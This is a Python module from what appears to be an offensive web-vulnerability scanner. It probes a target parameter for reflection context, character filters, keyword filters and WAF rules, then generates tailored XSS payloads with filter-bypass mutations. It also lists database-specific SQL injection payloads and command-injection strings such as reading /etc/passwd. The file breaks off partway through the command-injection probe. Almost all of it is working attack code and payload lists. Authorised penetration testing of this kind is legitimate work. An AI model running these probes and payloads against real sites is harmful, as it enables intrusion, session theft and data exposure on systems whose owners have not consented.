"""
cyberm4fia-scanner - Smart Payload Engine v2
Context-aware + Filter-aware + WAF-aware payload generation

Flow:
  1. Send harmless probe → detect WHERE input lands (context)
  2. Send char probe   → detect WHICH chars survive (filter)
  3. Send keyword probe → detect WHICH words are blocked (WAF/filter)
  4. Generate targeted payloads based on all 3 layers of intelligence
  5. Apply mutation engine for blocked keywords
"""

import sys
import os
import re

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.colors import log_info, log_warning
from utils.request import smart_request


# ══════════════════════════════════════════
# PROBE STRINGS
# ══════════════════════════════════════════

PROBE_STRING = "cybm4f1a7357"

# Chars to test
PROBE_CHARS = {
    "lt": "<",
    "gt": ">",
    "dquote": '"',
    "squote": "'",
    "slash": "/",
    "backslash": "\\",
    "lparen": "(",
    "rparen": ")",
    "backtick": "`",
    "ampersand": "&",
    "equals": "=",
}
CHAR_PROBE = PROBE_STRING + "<\"'>/()\\`&=" + PROBE_STRING

# Keywords to test for filtering
KEYWORD_PROBES = {
    "script": f"{PROBE_STRING}script{PROBE_STRING}",
    "alert": f"{PROBE_STRING}alert{PROBE_STRING}",
    "onerror": f"{PROBE_STRING}onerror{PROBE_STRING}",
    "onload": f"{PROBE_STRING}onload{PROBE_STRING}",
    "onfocus": f"{PROBE_STRING}onfocus{PROBE_STRING}",
    "img": f"{PROBE_STRING}img{PROBE_STRING}",
    "svg": f"{PROBE_STRING}svg{PROBE_STRING}",
    "iframe": f"{PROBE_STRING}iframe{PROBE_STRING}",
    "javascript": f"{PROBE_STRING}javascript{PROBE_STRING}",
}

# All keyword probes combined into one request
COMBINED_KEYWORD_PROBE = "|||".join(f"{k}={v}" for k, v in KEYWORD_PROBES.items())


# ══════════════════════════════════════════
# CONTEXT DETECTION (Layer 1)
# ══════════════════════════════════════════


def _detect_contexts(html, probe):
    """Find all probe locations and classify HTML context."""
    contexts = []
    html_lower = html.lower()
    probe_lower = probe.lower()

    idx = 0
    while True:
        pos = html_lower.find(probe_lower, idx)
        if pos == -1:
            break
        ctx = _classify_position(html, pos, probe)
        if ctx:
            contexts.append(ctx)
        idx = pos + len(probe)

    # Deduplicate by type
    seen = set()
    unique = []
    for c in contexts:
        if c["type"] not in seen:
            seen.add(c["type"])
            unique.append(c)
    return unique


def _classify_position(html, pos, probe):
    """Classify the HTML context at probe position."""
    before = html[max(0, pos - 300) : pos]
    before_lower = before.lower()

    # 1. HTML Comment
    if before.rfind("<!--") > before.rfind("-->"):
        return {"type": "HTML_COMMENT"}

    # 2. Inside <script>
    if before_lower.rfind("<script") > before_lower.rfind("</script"):
        js_before = before[before_lower.rfind("<script") :]
        # Count quotes to determine JS string context
        dq = js_before.count('"') - js_before.count('\\"')
        sq = js_before.count("'") - js_before.count("\\'")
        bt = js_before.count("`") - js_before.count("\\`")

        if dq % 2 == 1:
            return {"type": "JS_STRING_DOUBLE"}
        elif sq % 2 == 1:
            return {"type": "JS_STRING_SINGLE"}
        elif bt % 2 == 1:
            return {"type": "JS_TEMPLATE_LITERAL"}
        return {"type": "JS_CODE"}

    # 3. Inside <style>
    if before_lower.rfind("<style") > before_lower.rfind("</style"):
        return {"type": "CSS_CONTEXT"}

    # 4. Inside HTML tag?
    last_open = before.rfind("<")
    last_close = before.rfind(">")
    if last_open > last_close:
        tag_content = before[last_open:]

        # Extract tag name
        tag_match = re.match(r"<(\w+)", tag_content)
        tag_name = tag_match.group(1).lower() if tag_match else ""

        dq_open = tag_content.rfind('="')
        sq_open = tag_content.rfind("='")

        if dq_open > sq_open:
            remaining = tag_content[dq_open + 2 :]
            if '"' not in remaining:
                # Check URL attributes
                if re.search(
                    r"(href|src|action|data|formaction|poster|background"
                    r'|codebase|cite|manifest)\s*=\s*"$',
                    tag_content,
                    re.IGNORECASE,
                ):
                    return {"type": "ATTR_URL", "quote": '"', "tag": tag_name}

                # Check event handlers
                ev = re.search(r'(on\w+)\s*=\s*"$', tag_content, re.IGNORECASE)
                if ev:
                    return {
                        "type": "EVENT_HANDLER",
                        "quote": '"',
                        "event": ev.group(1),
                        "tag": tag_name,
                    }

                return {"type": "ATTR_DOUBLE_QUOTE", "tag": tag_name}

        elif sq_open > dq_open:
            remaining = tag_content[sq_open + 2 :]
            if "'" not in remaining:
                if re.search(
                    r"(href|src|action|data|formaction)\s*=\s*'$",
                    tag_content,
                    re.IGNORECASE,
                ):
                    return {"type": "ATTR_URL", "quote": "'", "tag": tag_name}

                return {"type": "ATTR_SINGLE_QUOTE", "tag": tag_name}

        # No-quote attribute or between attributes
        return {"type": "TAG_BARE", "tag": tag_name}

    # 5. Check if trapped inside a "Bad Tag" (title, textarea, iframe, noscript)
    # If the last opened tag was a bad tag, and it wasn't closed before our probe
    bad_tags = ["title", "textarea", "iframe", "noscript", "noembed", "template", "xmp"]

    # We need to find the innermost unclosed tag
    # A simple but effective heuristic: look backwards for tags
    temp_before = before_lower
    while True:
        last_open_bracket = temp_before.rfind("<")
        if last_open_bracket == -1:
            break

        # Is this a closing tag?
        if temp_before[last_open_bracket : last_open_bracket + 2] == "</":
            # Skip this block and keep looking backwards
            temp_before = temp_before[:last_open_bracket]
            continue

        # It's an opening tag, let's extract its name
        match = re.match(r"<([a-z0-9]+)", temp_before[last_open_bracket:])
        if match:
            found_tag = match.group(1)
            if found_tag in bad_tags:
                return {"type": "HTML_BODY", "bad_tag": found_tag}
            # If we found a normal tag that isn't closed, we're inside it,
            # but since it's not a bad tag, normal HTML_BODY payloads (like <img>) will work.
            break

        # If we couldn't parse the tag, just keep moving backwards
        temp_before = temp_before[:last_open_bracket]

    # 6. Default: regular HTML body
    return {"type": "HTML_BODY"}


# ══════════════════════════════════════════
# CHARACTER FILTER DETECTION (Layer 2)
# ══════════════════════════════════════════


def _detect_char_filters(response_text, probe):
    """Detect which special characters pass through filters."""
    allowed = {}
    idx = response_text.find(probe)
    if idx == -1:
        return {name: False for name in PROBE_CHARS}

    search_start = idx + len(probe)
    remaining = response_text[search_start:]
    end_idx = remaining.find(probe)
    if end_idx == -1:
        return {name: False for name in PROBE_CHARS}

    reflected = remaining[:end_idx]
    for name, char in PROBE_CHARS.items():
        allowed[name] = char in reflected

    return allowed


# ══════════════════════════════════════════
# KEYWORD FILTER DETECTION (Layer 3) ← NEW!
# ══════════════════════════════════════════


def _detect_keyword_filters(response_text, probe):
    """
    Detect which XSS keywords are filtered/stripped.
    Returns dict of keyword -> bool (True = keyword survives).
    """
    allowed = {}
    for keyword, keyword_probe in KEYWORD_PROBES.items():
        # Check if our keyword probe survived in the response
        if keyword_probe in response_text:
            allowed[keyword] = True
        elif probe in response_text:
            # Probe marker exists but keyword was stripped
            allowed[keyword] = False
        else:
            # Can't determine — assume allowed
            allowed[keyword] = True

    return allowed


# ══════════════════════════════════════════
# WAF SYNTAX FUZZING (Layer 4) ← NEW (XSStrike Port)
# ══════════════════════════════════════════

# Fuzz strings to test exactly which HTML structures the WAF drops
WAF_FUZZES = {
    "tag_open": "<test",
    "tag_slash": "<test//",
    "tag_close": "<test>",
    "tag_space": "<test x>",
    "attr_assign": "<test x=y",
    "attr_assign_slash": "<test x=y//",
    "attr_val_slash": "<test/oNxX=yYy//",
    "attr_val": "<test oNxX=yYy>",
    "event_handler": "<test onload=x",
    "event_null": "<test/o%00nload=x",
    "src_attr": "<test sRc=xxx",
    "data_js": "<test data=javascript:asa",
    "base_href": "<a href=x//",
    "double_quote": '">payload<br/attr="',
}

# All fuzzer probes combined loosely (if WAF strictly blocks anything, this will fail
# and we fallback to individual testing, or we just test these in a batch)
# NOTE: Instead of sending them all at once which guarantees a block, we'll integrate
# them dynamically into the probe phase if a WAF is detected.


def _detect_waf(resp):
    """Check if response indicates a WAF block."""
    if resp.status_code in [403, 406, 429, 503]:
        return True
    waf_headers = ["x-sucuri", "x-cdn", "cf-ray", "x-akamai"]
    for h in waf_headers:
        if h in [k.lower() for k in resp.headers]:
            return True
    waf_bodies = [
        "access denied",
        "blocked by",
        "security policy",
        "waf",
        "firewall",
        "modsecurity",
    ]
    body_lower = resp.text[:500].lower()
    for w in waf_bodies:
        if w in body_lower:
            return True
    return False


# ══════════════════════════════════════════
# PAYLOAD MUTATION ENGINE ← NEW!
# ══════════════════════════════════════════


def _mutate_function(payload, kw_allowed):
    """
    Replace blocked function names with alternatives.
    alert() -> confirm(), prompt(), top["al"+"ert"](1), etc.
    """
    mutations = []

    if not kw_allowed.get("alert", True):
        # alert is blocked — generate alternatives
        alternatives = [
            ("alert(1)", "confirm(1)"),
            ("alert(1)", "prompt(1)"),
            ("alert(1)", "print(1)"),
            ("alert(1)", "top['al'+'ert'](1)"),
            ("alert(1)", "window['alert'](1)"),
            ("alert(1)", "self['ale'+'rt'](1)"),
            ("alert(1)", "[1].find(alert)"),
            ("alert(1)", "alert?.()"),
            ("alert(document.cookie)", "confirm(document.cookie)"),
            ("alert(document.cookie)", "prompt(document.cookie)"),
        ]
        for old, new in alternatives:
            if old in payload:
                mutations.append(payload.replace(old, new))
    return mutations


def _mutate_tag(payload, kw_allowed):
    """Replace blocked tags with alternative tags."""
    mutations = []

    if not kw_allowed.get("script", True):
        # <script> blocked — should already have img/svg payloads
        # but add some exotic ones
        if "<script>" in payload.lower():
            mutations.extend(
                [
                    payload.replace("<script>", "<ScRiPt>").replace(
                        "</script>", "</ScRiPt>"
                    ),
                    payload.replace("<script>", "<scr<script>ipt>").replace(
                        "</script>", "</scr</script>ipt>"
                    ),
                ]
            )

    if not kw_allowed.get("img", True):
        # <img> blocked — use other tags
        if "<img " in payload.lower():
            tag_alternatives = [
                ("<img ", "<video "),
                ("<img ", "<audio "),
                ("<img ", "<input "),
                ("<img ", "<body "),
                ("<img ", "<details open "),
                ("<img ", "<embed "),
            ]
            for old, new in tag_alternatives:
                mutations.append(
                    payload.replace(old, new).replace(
                        "src=x onerror",
                        "src=x onerror"
                        if "video" not in new and "audio" not in new
                        else "autoplay onplay",
                    )
                )

    if not kw_allowed.get("svg", True):
        if "<svg" in payload.lower():
            mutations.append(
                payload.lower()
                .replace("<svg", "<math")
                .replace("onload", "onmouseover")
            )

    return mutations


def _mutate_event(payload, kw_allowed):
    """Replace blocked event handlers."""
    mutations = []
    event_alternatives = {
        "onerror": [
            "onload",
            "onfocus",
            "onmouseover",
            "onclick",
            "oninput",
            "onchange",
            "ontoggle",
        ],
        "onload": [
            "onfocus",
            "onmouseover",
            "onerror",
            "onclick",
            "onanimationstart",
            "ontransitionend",
        ],
        "onfocus": [
            "onmouseover",
            "onclick",
            "oninput",
            "onblur",
            "onkeydown",
        ],
    }

    for blocked_event, alternatives in event_alternatives.items():
        if not kw_allowed.get(blocked_event, True):
            for alt in alternatives:
                if kw_allowed.get(alt, True) and blocked_event in payload:
                    mutations.append(payload.replace(blocked_event, alt))

    return mutations


def _apply_mutations(payloads, kw_allowed):
    """Apply all mutation strategies to generate bypass payloads."""
    mutated = []
    seen = set()

    for p in payloads:
        # Function mutations
        for m in _mutate_function(p, kw_allowed):
            if m not in seen:
                seen.add(m)
                mutated.append(m)

        # Tag mutations
        for m in _mutate_tag(p, kw_allowed):
            if m not in seen:
                seen.add(m)
                mutated.append(m)

        # Event handler mutations
        for m in _mutate_event(p, kw_allowed):
            if m not in seen:
                seen.add(m)
                mutated.append(m)

    return mutated


# ══════════════════════════════════════════
# CONTEXT-AWARE PAYLOAD GENERATION
# ══════════════════════════════════════════


def _generate_payloads_for_context(ctx_type, ctx_info, allowed, kw_allowed, waf_blocks):
    """Generate targeted XSS payloads based on context + filters + keywords + WAF."""
    payloads = []

    if ctx_type == "HTML_BODY":
        has_tags = allowed.get("lt") and allowed.get("gt")
        has_parens = allowed.get("lparen") and allowed.get("rparen")
        has_backtick = allowed.get("backtick")

        # Check if we are trapped inside a bad tag
        # e.g., <title>payload</title>
        bad_tag_prefix = ""
        if "bad_tag" in ctx_info:
            bad_tag_prefix = f"</{ctx_info['bad_tag']}>"

        if has_tags:
            # Tags possible - build from allowed tags/events/functions
            tags_events = []

            # Available tags (in order of reliability)
            if kw_allowed.get("img", True):
                tags_events.append(
                    (f"{bad_tag_prefix}<img src=x {{event}}={{func}}>", "onerror")
                )
            if kw_allowed.get("svg", True):
                tags_events.append(
                    (f"{bad_tag_prefix}<svg {{event}}={{func}}>", "onload")
                )
                tags_events.append((f"{bad_tag_prefix}<svg/onload={{func}}>", "onload"))

            # Always try these (no keyword filter usually)
            tags_events.extend(
                [
                    (f"{bad_tag_prefix}<details open {{event}}={{func}}>", "ontoggle"),
                    (
                        f"{bad_tag_prefix}<input {{event}}={{func}} autofocus>",
                        "onfocus",
                    ),
                    (f"{bad_tag_prefix}<marquee {{event}}={{func}}>", "onstart"),
                    (f"{bad_tag_prefix}<body {{event}}={{func}}>", "onload"),
                    (
                        f"{bad_tag_prefix}<video src=x autoplay {{event}}={{func}}>",
                        "onplay",
                    ),
                    (
                        f"{bad_tag_prefix}<audio src=x autoplay {{event}}={{func}}>",
                        "onplay",
                    ),
                    (
                        f"{bad_tag_prefix}<select {{event}}={{func}} autofocus>",
                        "onfocus",
                    ),
                ]
            )

            if kw_allowed.get("script", True):
                if not waf_blocks.get("tag_close"):
                    tags_events.insert(
                        0, (f"{bad_tag_prefix}<script>{{func}}</script>", None)
                    )

            # WAF Syntax filters
            if waf_blocks.get("event_handler"):
                # All event handlers form exactly like <test onload=x are blocked
                # We retain only <script> and hope it bypasses, or use javascript:
                tags_events = [t for t in tags_events if t[1] is None]

            if waf_blocks.get("tag_space"):
                # <test x> is blocked, so we must use / instead of space
                new_te = []
                for template, ev in tags_events:
                    # replace space before event handler with a slash
                    t_mod = template.replace(" {event}=", "/{event}=")
                    new_te.append((t_mod, ev))
                tags_events = new_te

            # Available functions
            functions = []
            if has_parens:
                if kw_allowed.get("alert", True):
                    functions.extend(["alert(1)", "alert(document.cookie)"])
                else:
                    functions.extend(
                        [
                            "confirm(1)",
                            "prompt(1)",
                            "top['al'+'ert'](1)",
                            "window['alert'](1)",
                            "self['ale'+'rt'](1)",
                        ]
                    )
            elif has_backtick:
                if kw_allowed.get("alert", True):
                    functions.extend(["alert`1`"])
                else:
                    functions.extend(["confirm`1`", "prompt`1`"])
            else:
                # No parens, no backtick — encoding bypass
                functions.extend(
                    [
                        "location='javascript:alert%281%29'",
                        "location=name",
                        "throw 1",
                    ]
                )

            # Available events
            events_available = [
                e
                for e in [
                    "onerror",
                    "onload",
                    "onfocus",
                    "onmouseover",
                    "onclick",
                    "ontoggle",
                    "oninput",
                    "onstart",
                    "onplay",
                ]
                if kw_allowed.get(e, True)
            ]

            # Build payloads from combinations
            for template, default_event in tags_events:
                for func in functions[:3]:  # Top 3 functions
                    if default_event is None:
                        # <script> tag — no event needed
                        p = template.replace("{func}", func)
                        payloads.append(p)
                    else:
                        # Try default event first
                        event = default_event
                        if not kw_allowed.get(event, True):
                            # Default event blocked, pick first available
                            event = (
                                events_available[0]
                                if events_available
                                else default_event
                            )
                        p = template.replace("{event}", event).replace("{func}", func)
                        payloads.append(p)

                    if len(payloads) >= 25:
                        break
                if len(payloads) >= 25:
                    break

        else:
            # Tags blocked — encoding/case bypasses
            payloads.extend(
                [
                    f"{bad_tag_prefix}<ScRiPt>alert(1)</ScRiPt>",
                    f"{bad_tag_prefix}<IMG SRC=x onerror=alert(1)>",
                    f"{bad_tag_prefix}<svg/onload=alert(1)>",
                    f"{bad_tag_prefix}<<script>alert(1)//<</script>",
                    f"{bad_tag_prefix}<scr<script>ipt>alert(1)</scr</script>ipt>",
                    f"{bad_tag_prefix}\x3cscript\x3ealert(1)\x3c/script\x3e",
                    f"{bad_tag_prefix}%3cscript%3ealert(1)%3c/script%3e",
                ]
            )

    elif ctx_type == "ATTR_DOUBLE_QUOTE":
        if allowed.get("dquote"):
            base_payloads = [
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '" onfocus="alert(1)" autofocus="',
                '"><svg onload=alert(1)>',
                '" onmouseover="alert(1)" style="'
                'position:fixed;top:0;left:0;width:100%;height:100%" "',
                '" autofocus onfocus="alert(1)" "',
            ]
            payloads.extend(base_payloads)
        else:
            payloads.extend(
                [
                    " onfocus=alert(1) autofocus ",
                    " onmouseover=alert(1) ",
                    " autofocus onfocus=alert(1) ",
                ]
            )

    elif ctx_type == "ATTR_SINGLE_QUOTE":
        if allowed.get("squote"):
            payloads.extend(
                [
                    "' onfocus='alert(1)' autofocus='",
                    "'><script>alert(1)</script>",
                    "'><img src=x onerror=alert(1)>",
                    "' onmouseover='alert(1)' style='"
                    "position:fixed;top:0;left:0;width:100%;height:100%' '",
                ]
            )

    elif ctx_type == "ATTR_URL":
        payloads.extend(
            [
                "javascript:alert(1)",
                "javascript:alert(document.cookie)",
                "javascript:alert`1`",
                "data:text/html,<script>alert(1)</script>",
                "jAvAsCrIpT:alert(1)",
                "javascript:confirm(1)",
                " javascript:alert(1)",
                "&#106;avascript:alert(1)",
                "java\tscript:alert(1)",
                "javascript://%0aalert(1)",
            ]
        )
        if not kw_allowed.get("javascript", True):
            payloads.extend(
                [
                    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                    "data:text/html,<script>alert(1)</script>",
                ]
            )
        if allowed.get("dquote") or allowed.get("squote"):
            payloads.extend(
                [
                    '"><script>alert(1)</script>',
                    "' onfocus='alert(1)' autofocus='",
                ]
            )

    elif ctx_type == "EVENT_HANDLER":
        # Already inside onclick/onload etc — pure JS!
        if allowed.get("lparen"):
            payloads.extend(
                [
                    "alert(1)",
                    "alert(document.cookie)",
                    "confirm(1)",
                    "prompt(1)",
                ]
            )
            if not kw_allowed.get("alert", True):
                payloads.extend(
                    [
                        "confirm(1)",
                        "prompt(1)",
                        "top['al'+'ert'](1)",
                        "window['alert'](document.cookie)",
                    ]
                )
        else:
            payloads.extend(["alert`1`", "confirm`1`"])

    elif ctx_type == "JS_STRING_DOUBLE":
        if allowed.get("dquote"):
            payloads.extend(
                [
                    '";alert(1)//',
                    '";alert(1);"',
                    '"-alert(1)-"',
                    '";</script><script>alert(1)//',
                    '";alert(document.cookie)//',
                    '";confirm(1)//',
                ]
            )
            if not kw_allowed.get("alert", True):
                payloads.extend(
                    [
                        '";confirm(1)//',
                        '";prompt(1)//',
                        "\";top['al'+'ert'](1)//",
                    ]
                )
        payloads.append("</script><script>alert(1)//")

    elif ctx_type == "JS_STRING_SINGLE":
        if allowed.get("squote"):
            payloads.extend(
                [
                    "';alert(1)//",
                    "';alert(1);'",
                    "'-alert(1)-'",
                    "';</script><script>alert(1)//",
                    "';confirm(1)//",
                ]
            )
            if not kw_allowed.get("alert", True):
                payloads.extend(
                    [
                        "';confirm(1)//",
                        "';prompt(1)//",
                        "';top['al'+'ert'](1)//",
                    ]
                )
        payloads.append("</script><script>alert(1)//")

    elif ctx_type == "JS_TEMPLATE_LITERAL":
        payloads.extend(
            [
                "${alert(1)}",
                "${alert(document.cookie)}",
                "`-alert(1)-`",
                "`;alert(1)//",
                "${confirm(1)}",
                "${prompt(1)}",
            ]
        )

    elif ctx_type == "JS_CODE":
        payloads.extend(
            [
                "alert(1)",
                ";alert(1)//",
                "-alert(1)-",
                "alert(document.cookie)",
                ";confirm(1)//",
                ";prompt(1)//",
            ]
        )

    elif ctx_type == "HTML_COMMENT":
        if allowed.get("gt"):
            payloads.extend(
                [
                    "--><script>alert(1)</script><!--",
                    "--><img src=x onerror=alert(1)><!--",
                    "--><svg onload=alert(1)><!--",
                ]
            )

    elif ctx_type == "TAG_BARE":
        payloads.extend(
            [
                "onfocus=alert(1) autofocus",
                "onmouseover=alert(1)",
                "autofocus onfocus=alert(1)",
                "style=animation-name:x onanimationstart=alert(1)",
                "onclick=alert(1)",
            ]
        )
        if not kw_allowed.get("alert", True):
            payloads.extend(
                [
                    "onfocus=confirm(1) autofocus",
                    "onmouseover=prompt(1)",
                ]
            )

    elif ctx_type == "CSS_CONTEXT":
        payloads.extend(
            [
                "}</style><script>alert(1)</script>",
                "}</style><img src=x onerror=alert(1)>",
                "}</style><svg onload=alert(1)>",
            ]
        )

    return payloads


# ══════════════════════════════════════════
# PUBLIC API
# ══════════════════════════════════════════


def probe_xss_context(url, param, params, method="get", form_data=None, delay=0):
    """
    3-layer intelligent probe:
      Layer 1: Context detection (WHERE does input land?)
      Layer 2: Character filter (WHICH chars survive?)
      Layer 3: Keyword filter  (WHICH words are blocked?)
    Then generates targeted + mutated payloads.
    """
    from urllib.parse import urlparse, urlencode, urlunparse

    result = {
        "contexts": [],
        "allowed_chars": {},
        "keyword_filters": {},
        "waf_blocks": {},  # Tracks which syntax the WAF blocks
        "smart_payloads": [],
        "probe_reflected": False,
        "waf_detected": False,
    }

    def _send_probe(value):
        """Helper to send a probe value via GET or POST."""
        if method == "get":
            tp = params.copy()
            tp[param] = value
            parsed = urlparse(url)
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            return smart_request("get", turl, delay=delay)
        else:
            data = form_data.copy() if form_data else {}
            data[param] = value
            return smart_request("post", url, data=data, delay=delay)

    try:
        # ── Layer 1: Context Detection ──
        resp = _send_probe(PROBE_STRING)

        # WAF check
        if _detect_waf(resp):
            result["waf_detected"] = True
            log_warning(f"  ⚠️  WAF detected for [{param}]!")

        if PROBE_STRING not in resp.text:
            return result

        result["probe_reflected"] = True
        contexts = _detect_contexts(resp.text, PROBE_STRING)
        result["contexts"] = contexts

        # ── Layer 2: Character Filter Detection ──
        resp2 = _send_probe(CHAR_PROBE)
        allowed = _detect_char_filters(resp2.text, PROBE_STRING)
        result["allowed_chars"] = allowed

        # ── Layer 3: Keyword Filter Detection ──
        resp3 = _send_probe(COMBINED_KEYWORD_PROBE)
        kw_allowed = _detect_keyword_filters(resp3.text, PROBE_STRING)
        result["keyword_filters"] = kw_allowed

        # ── Layer 4: WAF Syntax Fuzzing ──
        # Only run if a WAF is detected or if important keywords/chars were blocked
        waf_blocks = {}
        if (
            result["waf_detected"]
            or not all(kw_allowed.values())
            or not allowed.get("lt", True)
        ):
            for fuzz_name, fuzz_payload in WAF_FUZZES.items():
                fuzz_resp = _send_probe(fuzz_payload)
                waf_blocks[fuzz_name] = _detect_waf(fuzz_resp)
        result["waf_blocks"] = waf_blocks

        # ── Generate Payloads ──
        all_payloads = []
        seen = set()

        for ctx in contexts:
            ctx_type = ctx["type"]
            base_payloads = _generate_payloads_for_context(
                ctx_type, ctx, allowed, kw_allowed, waf_blocks
            )
            for p in base_payloads:
                if p not in seen:
                    seen.add(p)
                    all_payloads.append(p)

        # ── Apply Mutations for blocked keywords ──
        mutations = _apply_mutations(all_payloads, kw_allowed)
        for m in mutations:
            if m not in seen:
                seen.add(m)
                all_payloads.append(m)

        result["smart_payloads"] = all_payloads

        # ── Logging ──
        if contexts:
            ctx_names = []
            for c in contexts:
                name = c["type"]
                if "tag" in c:
                    name += f" ({c['tag']})"
                if "bad_tag" in c:
                    name += f" [BAD_TAG: {c['bad_tag']}]"
                ctx_names.append(name)

            log_info(
                f"  🧠 Smart Probe [{param}]: "
                f"context={', '.join(ctx_names)} | "
                f"{len(all_payloads)} targeted payloads"
            )

            allowed_list = [n for n, ok in allowed.items() if ok]
            blocked_list = [n for n, ok in allowed.items() if not ok]
            if allowed_list:
                log_info(f"     ✅ Chars: {', '.join(allowed_list)}")
            if blocked_list:
                log_info(f"     ❌ Chars: {', '.join(blocked_list)}")

            kw_blocked = [n for n, ok in kw_allowed.items() if not ok]
            if kw_blocked:
                log_warning(f"     🚫 Keywords blocked: {', '.join(kw_blocked)}")
                log_info(f"     🔄 Generated {len(mutations)} mutation bypass payloads")

            syntax_blocked = [n for n, blocked in waf_blocks.items() if blocked]
            if syntax_blocked:
                log_warning(f"     🛡️  WAF Syntax Blocks: {', '.join(syntax_blocked)}")

    except Exception:
        pass  # Probe failure — fall back to static payloads

    return result


# ══════════════════════════════════════════
# SQLi SMART PROBE
# ══════════════════════════════════════════

# DB-specific error patterns
_DB_ERRORS = {
    "mysql": [
        "you have an error in your sql syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "unknown column",
        "warning: mysql",
    ],
    "postgresql": [
        "pg_query",
        "pg_exec",
        "unterminated quoted string",
        "psql:",
        "postgresql",
    ],
    "mssql": [
        "unclosed quotation mark",
        "microsoft sql",
        "odbc sql server",
        "mssql_query",
        "sqlsrv",
    ],
    "sqlite": [
        "sqlite3",
        "sqlite_",
        "unrecognized token",
        "sqlite.operationalerror",
    ],
    "oracle": [
        "ora-00",
        "oracle error",
        "quoted string not properly terminated",
    ],
}

# DB-specific comment syntax
_DB_COMMENTS = {
    "mysql": ["#", "-- -", "/**/"],
    "postgresql": ["--", "/**/"],
    "mssql": ["--", "/**/"],
    "sqlite": ["--", "/**/"],
    "oracle": ["--", "/**/"],
}

# DB-specific payloads
_DB_SQLI_PAYLOADS = {
    "mysql": [
        "' OR 1=1#",
        "' OR 1=1-- -",
        "' UNION SELECT NULL,NULL,NULL#",
        "1' ORDER BY 1#",
        "' AND SLEEP(3)#",
        "' AND 1=1#",
        "' AND 1=2#",
        "admin'#",
        "' OR ''='",
    ],
    "postgresql": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--",
        "'; SELECT pg_sleep(3)--",
        "' AND 1=1--",
    ],
    "mssql": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; WAITFOR DELAY '0:0:3'--",
        "' AND 1=1--",
    ],
    "sqlite": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=1--",
    ],
    "oracle": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL FROM dual--",
        "' AND 1=1--",
    ],
    "generic": [
        "' OR '1'='1",
        "' OR 1=1--",
        "') OR 1=1--",
        '" OR 1=1--',
        "' OR ''='",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "admin'--",
    ],
}


def probe_sqli_context(url, param, params, method="get", form_data=None, delay=0):
    """
    SQLi Smart Probe:
      1. Send quotes (' and ") → detect SQL errors
      2. Identify DB type from error message
      3. Generate DB-specific payloads
    """
    from urllib.parse import urlparse, urlencode, urlunparse

    result = {
        "db_type": None,
        "quote_type": None,
        "error_based": False,
        "smart_payloads": [],
    }

    def _send(value):
        if method == "get":
            tp = params.copy()
            tp[param] = value
            parsed = urlparse(url)
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            return smart_request("get", turl, delay=delay)
        else:
            data = form_data.copy() if form_data else {}
            data[param] = value
            return smart_request("post", url, data=data, delay=delay)

    try:
        # Get baseline
        baseline = _send("1")
        baseline_text = baseline.text.lower()

        # Test single quote
        resp_sq = _send("1'")
        sq_text = resp_sq.text.lower()

        # Test double quote
        resp_dq = _send('1"')
        dq_text = resp_dq.text.lower()

        # Detect DB type from error
        db_detected = None
        error_text = ""

        for probe_text in [sq_text, dq_text]:
            for db, errors in _DB_ERRORS.items():
                for err in errors:
                    if err in probe_text and err not in baseline_text:
                        db_detected = db
                        error_text = err
                        break
                if db_detected:
                    break
            if db_detected:
                break

        # Detect which quote triggers error
        # Check if SQL error patterns exist in the response (stronger check)
        all_err_patterns = [e for errs in _DB_ERRORS.values() for e in errs]

        def _has_sql_error(text):
            return any(e in text for e in all_err_patterns)

        sq_error = (
            sq_text != baseline_text
            and len(sq_text) != len(baseline_text)
            and (db_detected is not None or _has_sql_error(sq_text))
        )
        dq_error = (
            dq_text != baseline_text
            and len(dq_text) != len(baseline_text)
            and (db_detected is not None or _has_sql_error(dq_text))
        )

        quote = None
        if sq_error and not dq_error:
            quote = "'"
        elif dq_error and not sq_error:
            quote = '"'
        elif sq_error:
            quote = "'"  # Default to single quote

        result["db_type"] = db_detected
        result["quote_type"] = quote
        result["error_based"] = db_detected is not None

        # Generate payloads
        payloads = []
        if db_detected:
            payloads.extend(_DB_SQLI_PAYLOADS.get(db_detected, []))
            log_info(
                f"  🧠 SQLi Probe [{param}]: "
                f"DB={db_detected} | Quote={quote} | "
                f"Error='{error_text}' | "
                f"{len(payloads)} targeted payloads"
            )
        else:
            payloads.extend(_DB_SQLI_PAYLOADS["generic"])
            if quote:
                log_info(
                    f"  🧠 SQLi Probe [{param}]: "
                    f"DB=unknown | Quote={quote} | "
                    f"{len(payloads)} generic payloads"
                )

        result["smart_payloads"] = payloads

    except Exception:
        pass

    return result


# ══════════════════════════════════════════
# CMDi SMART PROBE
# ══════════════════════════════════════════

_CMDI_SEPARATORS = {
    "semicolon": ";",
    "pipe": "|",
    "double_pipe": "||",
    "ampersand": "&",
    "double_amp": "&&",
    "backtick": "`",
    "dollar_paren": "$(",
    "newline": "\n",
}

_CMDI_PAYLOADS_BY_SEP = {
    "semicolon": [";whoami", ";id", ";cat /etc/passwd", "; uname -a"],
    "pipe": ["|whoami", "|id", "|cat /etc/passwd", "| uname -a"],
    "double_pipe": ["||whoami", "||id"],
    "ampersand": ["&whoami", "&id"],
    "double_amp": ["&&whoami", "&&id"],
    "backtick": ["`whoami`", "`id`"],
    "dollar_paren": ["$(whoami)", "$(id)"],
    "newline": ["%0awhoami", "%0aid"],
}


def probe_cmdi_context(url, param, params, method="get", form_data=None, delay=0):
    """
    CMDi Smart Probe:
      1. Send each separator → check if filtered/stripped
      2. Generate payloads using only allowed separators
    """
    from urllib.parse import urlparse, urlencode, urlunparse

    result = {
        "allowed_separators": {},
        "smart_payloads": [],
    }

    def _send(value):
        if method == "get":
            tp = params.copy()
            tp[param] = value
            parsed = urlparse(url)
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            return smart_request("get", turl, delay=delay)
        else:
            data = form_data.copy() if form_data else {}
            data[param] = value
            return smart_request("post", url, data=data, delay=delay)

    try:
        probe = "cybm4test"
        allowed = {}

